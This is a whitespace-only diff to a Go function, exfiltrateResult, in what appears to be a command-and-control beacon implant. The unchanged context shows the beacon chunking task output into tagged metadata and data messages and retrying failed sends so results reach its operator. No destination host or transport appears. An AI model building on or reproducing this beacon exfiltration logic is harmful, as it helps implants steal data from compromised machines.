@@ -138,7 +138,7 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 	totalChunks := (len(result) + safeRawChunk - 1) / safeRawChunk
 
 	metaData := fmt.Sprintf("RESULT_META|%s|%s|%d|%d", b.id, taskID, len(result), totalChunks)
-	
+
 	// Retry metadata send up to 3 times - critical for establishing expectation
 	var err error
 	metaSent := false
@@ -152,7 +152,7 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 			time.Sleep(time.Duration(metaAttempt) * time.Second)
 		}
 	}
-	
+
 	if !metaSent {
 		return fmt.Errorf("failed to send result metadata after 3 attempts: %v", err)
 	}
@@ -188,7 +188,7 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 
 		chunk := result[start:end]
 		chunkData := fmt.Sprintf("DATA|%s|%s|%d|%s", b.id, taskID, i+1, chunk)
-		
+
 		// Retry each chunk up to 2 times before giving up
 		chunkSent := false
 		for chunkAttempt := 1; chunkAttempt <= 2; chunkAttempt++ {
@@ -202,7 +202,7 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 				time.Sleep(500 * time.Millisecond)
 			}
 		}
-		
+
 		if !chunkSent {
 			failedChunks++
 			// Don't abort immediately - try to send remaining chunks
@@ -224,7 +224,7 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 	if failedChunks > 0 {
 		return fmt.Errorf("failed to send %d/%d chunks", failedChunks, totalChunks)
 	}
-	
+
 	return nil
 }
 
